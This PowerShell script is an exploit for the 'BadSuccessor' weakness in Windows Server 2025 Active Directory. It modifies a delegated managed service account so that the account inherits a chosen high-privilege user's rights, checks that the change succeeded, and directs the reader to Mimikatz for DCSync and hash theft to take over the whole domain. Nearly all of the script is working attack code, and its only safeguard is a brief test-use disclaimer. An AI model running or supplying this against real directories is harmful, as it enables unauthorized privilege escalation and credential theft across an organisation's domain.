# Exploit-BadSuccessor.ps1
# Purpose: Demonstrate privilege escalation via the BadSuccessor vulnerability in Windows Server 2025.
# Requires: PowerShell with Active Directory module and sufficient permissions (e.g., CreateChild on an OU).
# Disclaimer: Use only in authorized test environments. Do not use maliciously.

Import-Module ActiveDirectory

# Step 1: Define variables
$DMsaName = "MydMSA01"        # Name for the malicious dMSA
$TargetUser = "walid"  # Replace with a high-privilege target (e.g., domain admin)
$TargetOU = "OU=IT,DC=seclabs,DC=local"  # Replace with a valid OU path
$FQDN = "$DMsaName.seclabs.local"  # Fully Qualified Domain Name (FQDN)



# Step 2: Manipulate dMSA attributes to inherit target user's permissions
Write-Host "[*] Modifying dMSA attributes to inherit '$TargetUser' permissions..."
try {
    # Link the dMSA to the target user (BadSuccessor exploit)
    Set-ADServiceAccount -Identity "$DMsaName" `
                         -Add @{"msDS-ManagedAccountPrecededByLink"="CN=$TargetUser,OU=IT,DC=seclabs,DC=local"} `
                         -Replace @{"msDS-DelegatedMSAState"="1"} -ErrorAction Stop
    Write-Host "[+] Attributes modified successfully."
} catch {
    Write-Host "[-] Failed to modify dMSA attributes: $_"
    exit
}

# Step 3: Verify exploitation success
Write-Host "[*] Verifying privileges for dMSA '$DMsaName'..."
try {
    $PAC = Get-ADServiceAccount -Identity "$DMsaName" -Properties "msDS-ManagedAccountPrecededByLink"
    if ($PAC."msDS-ManagedAccountPrecededByLink" -match $TargetUser) {
        Write-Host "[+] Success: dMSA '$DMsaName' now inherits permissions from '$TargetUser'."
        Write-Host "[*] Use tools like Mimikatz to perform DCSync or extract NTLM hashes for full domain compromise."
    } else {
        Write-Host "[-] Exploit failed. Check permissions or OU path."
    }
} catch {
    Write-Host "[-] Verification failed: $_"
}
